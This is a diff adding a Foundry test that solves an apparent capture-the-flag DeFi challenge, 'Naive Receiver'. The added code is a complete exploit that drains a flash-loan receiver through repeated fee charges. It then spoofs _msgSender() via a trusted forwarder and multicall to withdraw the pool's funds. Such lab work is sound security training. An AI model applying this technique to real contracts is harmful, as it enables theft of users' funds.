@@ -6,6 +6,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
 import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
 import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
+import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
 
 contract NaiveReceiverChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -77,7 +78,41 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
+        bytes[] memory calls = new bytes[](11);
+
+        // Drain the flashloan receiver, calling flashLoan 10 times
+        // withdraing the fixed fee each time
+        for (uint256 i = 0; i < 10; ++i) {
+            calls[i] = abi.encodeWithSelector(
+                pool.flashLoan.selector,
+                receiver,
+                address(weth),
+                0,
+                bytes("")
+            );
+        }
+
+        // Call the withdraw method from the pool, forging _msgSender() to return the deployer address
+        // The _msgSender() method returns the last 20 bytes of msg.data if the msg.sender is the trusted forwarder,
+        // meaning it will return the address of the deployer and allow to withdraw the funds from the pool to the recovery address
+        calls[10] = abi.encodeWithSelector(pool.withdraw.selector, (WETH_IN_POOL + WETH_IN_RECEIVER), recovery, deployer);
         
+        BasicForwarder.Request memory request = BasicForwarder.Request({
+            from: player,
+            target: address(pool),
+            value: 0,
+            gas: 1000000,
+            nonce: forwarder.nonces(player),
+            data: abi.encodeWithSelector(pool.multicall.selector, calls),
+            deadline: block.timestamp + 1
+        });
+
+        bytes32 digest = MessageHashUtils.toTypedDataHash(forwarder.domainSeparator(), forwarder.getDataHash(request));
+
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        forwarder.execute(request, signature);
     }
 
     /**
